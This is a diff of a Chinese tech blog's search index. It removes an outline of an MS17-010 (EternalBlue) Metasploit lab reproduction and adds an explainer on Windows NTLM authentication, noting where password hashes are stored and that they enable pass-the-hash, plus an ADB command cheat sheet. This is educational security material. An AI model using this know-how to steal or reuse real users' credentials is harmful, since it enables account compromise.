@@ -1,74 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>ADB常用命令</title>
-    <url>/2019/06/21/ADB%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<blockquote><p>摘下红花送伊人<br>红花似火绾青丝<br>红花啊红花，绾起伊人的青丝<br>伊人笑靥如花</p>
-<p>摘下白花送伊人<br>白花如雪别心口<br>白花啊白花，别在伊人的心口<br>伊人皎洁如月<br>伊人皎洁如月</p>
-<footer><strong>美绪</strong><cite><a href="https://www.bilibili.com/bangumi/play/ep259703" target="_blank" rel="noopener">Bilibili《多罗罗》</a></cite></footer></blockquote>
-
-<a id="more"></a>
-
-<hr>
-<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1353269777&auto=1&height=66"></iframe>
-
-<p><img src="73547799_p0.jpg" alt="73547799_p0.jpg"></p>
-<!--  -->
-
-<br>
-
-<h2 id="基本与应用"><a href="#基本与应用" class="headerlink" title="基本与应用"></a>基本与应用</h2><hr>
-<h3 id="查看设备"><a href="#查看设备" class="headerlink" title="查看设备"></a>查看设备</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb devices </span><br><span class="line"><span class="comment"># List of devices attached</span></span><br><span class="line"><span class="comment"># cf264b8f	device</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="进入shell"><a href="#进入shell" class="headerlink" title="进入shell"></a>进入shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb shell</span><br><span class="line"><span class="comment"># OnePlus3T:/ $ ll</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="以-root-权限运行-手机需要-root"><a href="#以-root-权限运行-手机需要-root" class="headerlink" title="以 root 权限运行(手机需要 root)"></a>以 root 权限运行(手机需要 root)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb root</span><br><span class="line"><span class="comment"># restarting adbd as root</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># adbd cannot run as root in production builds</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="无线连接（需要借助-USB-线）"><a href="#无线连接（需要借助-USB-线）" class="headerlink" title="无线连接（需要借助 USB 线）"></a>无线连接（需要借助 USB 线）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 找到 IP地址(ifconfig/ip addr/ip link)</span></span><br><span class="line">OnePlus3T:/ $ ifconfig</span><br><span class="line"></span><br><span class="line"><span class="comment"># 让设备在 任意 端口监听 TCP/IP 连接</span></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb tcpip 8848</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 断开连接</span></span><br><span class="line"><span class="comment"># 通过 IP 地址连接设备</span></span><br><span class="line">adb connect &lt;device-ip-address[:port]&gt;</span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb connect 192.168.1.3:8848</span></span><br><span class="line"><span class="comment"># connected to 192.168.1.3:8848</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看设备是否出现</span></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb devices</span></span><br><span class="line"><span class="comment"># List of devices attached</span></span><br><span class="line"><span class="comment"># 192.168.1.3:8848	unauthorized</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="断开无线连接"><a href="#断开无线连接" class="headerlink" title="断开无线连接"></a>断开无线连接</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb disconnect &lt;device-ip-address&gt;</span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb disconnect 192.168.1.3:8848</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="查看应用列表"><a href="#查看应用列表" class="headerlink" title="查看应用列表"></a>查看应用列表</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell pm list packages [-f] [-d] [-e] [-s] [-3] [-i] [-u] [--user USER_ID] [FILTER]</span></span><br><span class="line"><span class="comment"># -s 	只显示系统应用</span></span><br><span class="line"><span class="comment"># -3 	只显示第三方应用</span></span><br><span class="line"><span class="comment"># &lt;FILTER&gt; 	包名包含 &lt;FILTER&gt; 字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm list packages -3</span></span><br><span class="line"><span class="comment"># package:com.github.shadowsocks</span></span><br><span class="line"><span class="comment"># package:com.chenupt.day</span></span><br><span class="line"><span class="comment"># package:org.telegram.messenger</span></span><br><span class="line"><span class="comment"># package:com.niksoftware.snapseed</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm list packages -s</span></span><br><span class="line"><span class="comment"># package:com.oneplus.calculator</span></span><br><span class="line"><span class="comment"># package:net.oneplus.weather</span></span><br><span class="line"><span class="comment"># package:com.android.cts.priv.ctsshim</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm list packages bili</span></span><br><span class="line"><span class="comment"># package:com.hypergryph.arknights.bilibili</span></span><br><span class="line"><span class="comment"># package:com.bilibili.comic</span></span><br><span class="line"><span class="comment"># package:com.digitalsky.girlsfrontline.cn.bili</span></span><br><span class="line"><span class="comment"># package:tv.danmaku.bili</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="安装-卸载-APK"><a href="#安装-卸载-APK" class="headerlink" title="安装/卸载 APK"></a>安装/卸载 APK</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb install [-lrtsdg] &lt;path_to_apk&gt;</span></span><br><span class="line"><span class="comment"># -l 	将应用安装到保护目录 /mnt/asec</span></span><br><span class="line"><span class="comment"># -r 	允许覆盖安装</span></span><br><span class="line"><span class="comment"># -t 	允许安装 AndroidManifest.xml 里 application 指定 android:testOnly="true" 的应用</span></span><br><span class="line"><span class="comment"># -s 	将应用安装到 sdcard</span></span><br><span class="line"><span class="comment"># -d 	允许降级覆盖安装</span></span><br><span class="line"><span class="comment"># -g 	授予所有运行时权限</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 详细 : &lt;https://github.com/mzlogin/awesome-adb#%E5%AE%89%E8%A3%85-apk&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb uninstall [-k] &lt;packagename&gt;</span></span><br><span class="line"><span class="comment"># &lt;packagename&gt; 表示应用的包名，-k 参数可选，表示卸载应用但保留数据和缓存目录</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb uninstall com.bilibili.comic</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="清除应用数据与缓存"><a href="#清除应用数据与缓存" class="headerlink" title="清除应用数据与缓存"></a>清除应用数据与缓存</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell dumpsys package &lt;packagename&gt;</span></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm clear com.bilibili.comic</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="查看应用详细信息"><a href="#查看应用详细信息" class="headerlink" title="查看应用详细信息"></a>查看应用详细信息</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell dumpsys package com.bilibili.comic</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="查看应用安装路径"><a href="#查看应用安装路径" class="headerlink" title="查看应用安装路径"></a>查看应用安装路径</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell pm path &lt;PACKAGE&gt;</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm path com.bilibili.comic </span></span><br><span class="line"><span class="comment"># package:/data/app/com.bilibili.comic-VefU-I3Sq3yFa7hzXBuAXg==/base.apk</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="强制停止应用"><a href="#强制停止应用" class="headerlink" title="强制停止应用"></a>强制停止应用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell am force-stop &lt;packagename&gt;</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell am force-stop com.taobao.taoba</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h2><hr>
-<h3 id="复制设备里的文件到电脑"><a href="#复制设备里的文件到电脑" class="headerlink" title="复制设备里的文件到电脑"></a>复制设备里的文件到电脑</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb pull &lt;设备里的文件路径&gt; [电脑上的目录]</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb pull /sdcard/Pictures ~/Pictures</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="复制电脑里的文件到设备"><a href="#复制电脑里的文件到设备" class="headerlink" title="复制电脑里的文件到设备"></a>复制电脑里的文件到设备</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb push &lt;电脑上的文件路径&gt; &lt;设备里的目录&gt;</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb push ~/Documents/Python/hello.py /sdcard/Python</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="模拟按键-输入"><a href="#模拟按键-输入" class="headerlink" title="模拟按键/输入"></a>模拟按键/输入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># input [&lt;source&gt;] &lt;command&gt; [&lt;arg&gt;...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># adb shell input keyevent &lt;keycode&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 亮屏</span></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell input keyevent 224</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 详细: &lt;https://github.com/mzlogin/awesome-adb#%E6%A8%A1%E6%8B%9F%E6%8C%89%E9%94%AE%E8%BE%93%E5%85%A5&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="实用功能"><a href="#实用功能" class="headerlink" title="实用功能"></a>实用功能</h2><h3 id="截图保存到电脑"><a href="#截图保存到电脑" class="headerlink" title="截图保存到电脑"></a>截图保存到电脑</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@arch ~ -&gt;<span class="comment"># adb exec-out screencap -p &gt; sc.png</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="录制屏幕"><a href="#录制屏幕" class="headerlink" title="录制屏幕"></a>录制屏幕</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 录制屏幕以 mp4 格式保存到 /sdcard</span></span><br><span class="line">adb shell screenrecord /sdcard/filename.mp4</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按 Ctrl-C 停止</span></span><br><span class="line"><span class="comment"># 默认录制时间和最长录制时间都是 180 秒</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --size WIDTHxHEIGHT 	视频的尺寸，比如 1280x720，默认是屏幕分辨率。</span></span><br><span class="line"><span class="comment"># --bit-rate RATE 	视频的比特率，默认是 4Mbps。</span></span><br><span class="line"><span class="comment"># --time-limit TIME 	录制时长，单位秒。</span></span><br><span class="line"><span class="comment"># --verbose 	输出更多信息。</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Top-amp-amp-ps"><a href="#Top-amp-amp-ps" class="headerlink" title="Top &amp;&amp; ps"></a>Top &amp;&amp; ps</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell top</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell ps</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="查看进程-UID"><a href="#查看进程-UID" class="headerlink" title="查看进程 UID"></a>查看进程 UID</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell dumpsys package &lt;packagename&gt; | grep userId=</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell dumpsys package com.bilibili.comic | grep userId=</span></span><br><span class="line">    <span class="comment"># userId=10203</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>基本的 linux命令（ls/cat/df/rm/…）</p>
-</blockquote>
-<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ul>
-<li><a href="https://github.com/mzlogin/awesome-adb#%E6%A8%A1%E6%8B%9F%E6%8C%89%E9%94%AE%E8%BE%93%E5%85%A5" target="_blank" rel="noopener">ADB Usage Complete / ADB 用法大全</a> </li>
-</ul>
-]]></content>
-      <tags>
-        <tag>Android</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Test Page</title>
     <url>/2019/06/12/Test-Page/</url>
     <content><![CDATA[<p>本页面用来进行测试</p>
@@ -565,46 +497,215 @@ nslookup会得到 DNS解析服务器保存在缓存中的非权威解答
       </tags>
   </entry>
   <entry>
-    <title>MS17-010复现</title>
-    <url>/2019/09/13/MS17-010%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<p>MS17-010/EternalBlue/永恒之蓝</p>
+    <title>Windows认证体系—NTLM认证</title>
+    <url>/2019/08/23/Windows%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB%E2%80%94NTLM%E8%AE%A4%E8%AF%81/</url>
+    <content><![CDATA[<p>NTLM Hash与 NTLM的关系、NTLM网络认证流程</p>
 <a id="more"></a>
 
-<p><a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010" target="_blank" rel="noopener">Microsoft 安全公告 MS17-010</a></p>
-<p>当 Microsoft 服务器消息块 1.0 (SMBv1)服务器处理某些请求时，存在多个远程执行代码漏洞。<br>成功利用这些漏洞的攻击者可以获取在目标系统上执行代码的能力</p>
-<p>受影响的系统(详细系统版本请查看公告)：</p>
-<ul>
-<li>Windows Vista</li>
-<li>Windows Server 2008</li>
-<li>Windows 7</li>
-<li>Windows Server 2008 R2</li>
-<li>Windows 8.1</li>
-<li>Windows Server 2012 和 Windows Server 2012 R2</li>
-<li>Windows RT 8.1</li>
-<li>Windows 10</li>
-<li>Windows Server 2016</li>
-</ul>
-<p>相对应的 CVE（Windows SMB 远程代码执行漏洞）：</p>
-<ul>
-<li>CVE-2017-0143</li>
-<li>CVE-2017-0144</li>
-<li>CVE-2017-0145</li>
-<li>CVE-2017-0146</li>
-<li>CVE-2017-0148</li>
+<h2 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h2><ul>
+<li><code>NTLM Hash</code> </li>
+<li><code>NTLM</code> </li>
+<li><code>LSASS</code> </li>
+<li><code>Net-NTLM hash</code> </li>
 </ul>
 <br>
 
-<p>复现环境：</p>
+<p>关键词解释：</p>
 <ul>
-<li>Windows 7 (Build 7601, Service Pack 1)</li>
-<li>Ubuntu server(Metasploit)</li>
+<li><code>NTLM Hash</code>：存储在<code>SAM数据库</code>及<code>NTDS数据库</code>中对密码进行 Hash摘要计算后的结果</li>
+<li><code>Net-NTLM hash</code>：通常是指网络环境下 NTLM认证中的 Hash (下有说明)</li>
+<li><code>NTLM</code>：除 <code>Kerberos</code>之外的一种网络认证协议，只支持 Windows </li>
+<li><code>LSASS</code>：Windows系统的安全机制（系统进程）。用于本地安全和登陆策略 </li>
 </ul>
 <br>
 
-<p><img src="./2019-09-13-11-24-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="000" title="搜索漏洞"><br><img src="./2019-09-13-11-10-05%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="001" title="扫描模块"><br><img src="./2019-09-13-10-41-45%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="002" title="返回 meterpreter"></p>
+<h2 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h2><br>
+
+<p>Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在 SAM (<em>Security Account Manager Database</em>，安全账号管理数据库)中。</p>
+<blockquote>
+<p>SAM文件的路径是 <code>%SystemRoot%\system32\config\sam</code> </p>
+</blockquote>
+<p>在进行本地认证的过程中，当用户登录时，系统将用户输入的明文密码加密成 <em><code>NTLM Hash</code>*，与  SAM数据库中的 *<code>NTLM Hash</code></em> 进行比较，从而实现认证</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</span><br></pre></td></tr></table></figure>
+
+<p>首先，用户注销、重启、锁屏后，操作系统会让 <code>winlogon</code>显示登录界面，也就是输入框，接收输入后，将密码交给 <code>lsass</code>进程，这个进程中会存一份明文密码，将明文密码加密成 <code>NTLM Hash</code>，对比 SAM数据库中的 Hash进行验证</p>
+<br>
+
+<h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><br>
+
+<blockquote>
+<p>Hash，<strong><em>一种将任意长度的消息压缩到某一固定长度的消息摘要的函数</em></strong> 。—— <a href="https://baike.baidu.com/item/Hash/390310?fr=aladdin" target="_blank" rel="noopener">度娘百科</a>  </p>
+</blockquote>
+<p>通常意义上的 <code>NTLM Hash</code>指存储在 <code>SAM数据库</code>及<code>NTDS数据库</code>中对密码进行 Hash摘要计算后的结果，这类 Hash可以直接用于 PTH，并且通常存在于 <code>LSASS</code>进程中，便于 SSP（NTLM 安全支持提供程序）使用</p>
+<br>
+
+<h3 id="NTLM-Hash的生成"><a href="#NTLM-Hash的生成" class="headerlink" title="NTLM Hash的生成"></a>NTLM Hash的生成</h3><br>
+
+<ul>
+<li>用户密码：<code>susi2001</code></li>
+<li>首先，密码经过十六进制转为 <code>7375736932303031</code> </li>
+<li>将十六进制结果转为 Unicode格式 <code>73007500730069003200300030003100</code></li>
+<li>以 Hex（16进制）数据作 MD4加密 <code>ed3202726368f8e9fd23e78fbfac8c13</code> </li>
+</ul>
+<br>
+
+<blockquote>
+<p>MD4加密使用 <code>HashCalc</code> </p>
+</blockquote>
+<br>
+
+<h2 id="NTLM-和-NTLM-Hash"><a href="#NTLM-和-NTLM-Hash" class="headerlink" title="NTLM 和 NTLM Hash"></a>NTLM 和 NTLM Hash</h2><br>
+
+<p>NTLM 是一种网络认证协议，与 <code>NTLM Hash</code>的关系就是：<strong>NTLM网络认证协议是以 <code>NTLM Hash</code> 作为根本凭证进行认证的协议</strong></p>
+<br>
+
+<h2 id="NTLM网络认证机制"><a href="#NTLM网络认证机制" class="headerlink" title="NTLM网络认证机制"></a>NTLM网络认证机制</h2><br>
+
+<p>NTLM是一种基于质询/应答 （<em>Challenge/Response</em> ）消息交换模式的认证机制，常用于 <strong>工作组</strong>和<strong>域环境</strong>下<em>登录场景的身份认证</em></p>
+<br>
+
+<h3 id="NTLM-认证方式"><a href="#NTLM-认证方式" class="headerlink" title="NTLM 认证方式"></a>NTLM 认证方式</h3><br>
+
+<ul>
+<li><strong>交互式认证</strong> ：使用域账号登录到客户端；涉及两部分（客户端、域控）</li>
+<li><strong>非交互式认证</strong> ：在已经登陆 的客户端上使用 SSO 的方式访问一台服务器；涉及三部分（客户端、域控、服务器）</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 非交互式场景</span></span><br><span class="line"></span><br><span class="line">net use Z: \\10.0.1.102\vefs <span class="string">"password"</span> /user:domain\xiaoming </span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">net use Z: \\10.0.1.102\vefs <span class="string">"password"</span> /user:xiaoming</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h3><br>
+
+<p>NTLM协议的认证过程有三步：</p>
+<ul>
+<li><strong>协商</strong>：主要用于确认双方协议版本（NTLMv1、NTLMv2等）</li>
+<li><strong>质询</strong>：质询/应答 （<em>Challenge/Response</em>）模式，用于消息交换</li>
+<li><strong>验证</strong>：验证身份合法性，通常由 Server端或 DC完成这个过程</li>
+</ul>
+<p>大致流程如下：</p>
+<ul>
+<li>使用用户名和密码尝试登录客户端</li>
+<li>客户端对密码进行哈希处理并缓存密码 hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求</li>
+<li>服务器生成一个 16字节的随机数，称为 <strong>质询</strong> (Challenge) 或随机数 (nonce.aspx)，并发送给客户端</li>
+<li>客户端使用缓存的 <strong><em>用户密码的 Hash</em></strong> 对此 <code>Challenge</code> 进行加密，加密结果为 <code>Response</code>（暂且叫做<code>Challenge1</code>），然后将结果发送给服务器</li>
+<li>服务器发送三项数据给域控制器：<ul>
+<li><code>User name</code></li>
+<li>发送给客户端的 <code>Challenge</code>（已加密） </li>
+<li>从客户端接收到的 <code>Response</code> </li>
+</ul>
+</li>
+<li>域控制器使用 <code>User name</code>从 AD中检索该用户密码的 <code>NTLM Hash</code>，并使用此 <code>NTLM Hash</code>来加密 <em><code>Challenge</code></em> ，然后把这个值和客户端计算的响应值（<code>Challenge1</code>）进行比较。如果它们相同，则验证成功</li>
+</ul>
+<blockquote>
+<p>经过 <code>NTLM Hash</code>加密 <code>Challenge</code>的结果在网络协议中称之为 <code>Net NTLM Hash</code> </p>
+</blockquote>
+<blockquote>
+<p>在以上流程中，用户的登录密码 Hash 即为 <code>NTLM Hash</code>，Response中则包含 <code>Net-NTLM Hash</code></p>
+</blockquote>
+<br>
+
+<h3 id="NTLM-v2"><a href="#NTLM-v2" class="headerlink" title="NTLM v2"></a>NTLM v2</h3><br>
+
+<blockquote>
+<p>NTLM version 2 (NTLMv2)是在 Windows NT 4.0 SP4中引入的（在 Windows 2000 中得到了本地支持），它通过加强协议来防止许多欺骗攻击，并增加服务器向客户机进行身份验证的能力，从而增强了 NTLM的安全性</p>
+</blockquote>
+<p><code>NTLM v1</code> 与 <code>NTLM v2</code> 最显著的区别就是 <code>Challenge</code> 与 <strong>加密算法</strong> 不同，共同点就是加密的原料都是 <code>NTLM Hash</code> ：</p>
+<ul>
+<li>Challenge：<ul>
+<li><code>v1</code>： 8-byte</li>
+<li><code>v2</code>：16-byte </li>
+</ul>
+</li>
+<li>Net NTLM Hash：<ul>
+<li><code>v1</code>：DES</li>
+<li><code>v2</code>： HMAC-MD5</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># NTLM</span></span><br><span class="line"></span><br><span class="line">C = <span class="number">8</span>-byte server challenge, random</span><br><span class="line">K1 | K2 | K3 = NTLM-Hash | <span class="number">5</span>-bytes<span class="number">-0</span></span><br><span class="line">response = DES(K1,C) | DES(K2,C) | DES(K3,C)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># NTLM v2</span></span><br><span class="line"></span><br><span class="line">SC = <span class="number">8</span>-byte server challenge, random</span><br><span class="line">CC = <span class="number">8</span>-byte client challenge, random</span><br><span class="line">CC* = (X, time, CC2, domain name)</span><br><span class="line">v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)</span><br><span class="line">LMv2 = HMAC-MD5(v2-Hash, SC, CC)</span><br><span class="line">NTv2 = HMAC-MD5(v2-Hash, SC, CC*)</span><br><span class="line">response = LMv2 | CC | NTv2 | CC*</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ul>
+<li><a href="http://wikipedia.moesalih.com/NTLM" target="_blank" rel="noopener">NT LAN Manager</a></li>
+<li><a href="http://www.voidcn.com/article/p-voxshmho-sn.html" target="_blank" rel="noopener">NTLM 协议</a></li>
+<li><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/" target="_blank" rel="noopener">Windows下的密码hash——NTLM hash和Net-NTLM hash介绍</a></li>
+</ul>
 ]]></content>
       <tags>
-        <tag>漏洞复现</tag>
+        <tag>Security</tag>
+        <tag>Windows</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ADB常用命令</title>
+    <url>/2019/06/21/ADB%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<blockquote><p>摘下红花送伊人<br>红花似火绾青丝<br>红花啊红花，绾起伊人的青丝<br>伊人笑靥如花</p>
+<p>摘下白花送伊人<br>白花如雪别心口<br>白花啊白花，别在伊人的心口<br>伊人皎洁如月<br>伊人皎洁如月</p>
+<footer><strong>美绪</strong><cite><a href="https://www.bilibili.com/bangumi/play/ep259703" target="_blank" rel="noopener">Bilibili《多罗罗》</a></cite></footer></blockquote>
+
+<a id="more"></a>
+
+<hr>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1353269777&auto=1&height=66"></iframe>
+
+<p><img src="73547799_p0.jpg" alt="73547799_p0.jpg"></p>
+<!--  -->
+
+<br>
+
+<h2 id="基本与应用"><a href="#基本与应用" class="headerlink" title="基本与应用"></a>基本与应用</h2><hr>
+<h3 id="查看设备"><a href="#查看设备" class="headerlink" title="查看设备"></a>查看设备</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb devices </span><br><span class="line"><span class="comment"># List of devices attached</span></span><br><span class="line"><span class="comment"># cf264b8f	device</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="进入shell"><a href="#进入shell" class="headerlink" title="进入shell"></a>进入shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb shell</span><br><span class="line"><span class="comment"># OnePlus3T:/ $ ll</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="以-root-权限运行-手机需要-root"><a href="#以-root-权限运行-手机需要-root" class="headerlink" title="以 root 权限运行(手机需要 root)"></a>以 root 权限运行(手机需要 root)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb root</span><br><span class="line"><span class="comment"># restarting adbd as root</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># adbd cannot run as root in production builds</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="无线连接（需要借助-USB-线）"><a href="#无线连接（需要借助-USB-线）" class="headerlink" title="无线连接（需要借助 USB 线）"></a>无线连接（需要借助 USB 线）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 找到 IP地址(ifconfig/ip addr/ip link)</span></span><br><span class="line">OnePlus3T:/ $ ifconfig</span><br><span class="line"></span><br><span class="line"><span class="comment"># 让设备在 任意 端口监听 TCP/IP 连接</span></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb tcpip 8848</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 断开连接</span></span><br><span class="line"><span class="comment"># 通过 IP 地址连接设备</span></span><br><span class="line">adb connect &lt;device-ip-address[:port]&gt;</span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb connect 192.168.1.3:8848</span></span><br><span class="line"><span class="comment"># connected to 192.168.1.3:8848</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看设备是否出现</span></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb devices</span></span><br><span class="line"><span class="comment"># List of devices attached</span></span><br><span class="line"><span class="comment"># 192.168.1.3:8848	unauthorized</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="断开无线连接"><a href="#断开无线连接" class="headerlink" title="断开无线连接"></a>断开无线连接</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb disconnect &lt;device-ip-address&gt;</span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb disconnect 192.168.1.3:8848</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="查看应用列表"><a href="#查看应用列表" class="headerlink" title="查看应用列表"></a>查看应用列表</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell pm list packages [-f] [-d] [-e] [-s] [-3] [-i] [-u] [--user USER_ID] [FILTER]</span></span><br><span class="line"><span class="comment"># -s 	只显示系统应用</span></span><br><span class="line"><span class="comment"># -3 	只显示第三方应用</span></span><br><span class="line"><span class="comment"># &lt;FILTER&gt; 	包名包含 &lt;FILTER&gt; 字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm list packages -3</span></span><br><span class="line"><span class="comment"># package:com.github.shadowsocks</span></span><br><span class="line"><span class="comment"># package:com.chenupt.day</span></span><br><span class="line"><span class="comment"># package:org.telegram.messenger</span></span><br><span class="line"><span class="comment"># package:com.niksoftware.snapseed</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm list packages -s</span></span><br><span class="line"><span class="comment"># package:com.oneplus.calculator</span></span><br><span class="line"><span class="comment"># package:net.oneplus.weather</span></span><br><span class="line"><span class="comment"># package:com.android.cts.priv.ctsshim</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm list packages bili</span></span><br><span class="line"><span class="comment"># package:com.hypergryph.arknights.bilibili</span></span><br><span class="line"><span class="comment"># package:com.bilibili.comic</span></span><br><span class="line"><span class="comment"># package:com.digitalsky.girlsfrontline.cn.bili</span></span><br><span class="line"><span class="comment"># package:tv.danmaku.bili</span></span><br></pre></td></tr></table></figure>
+
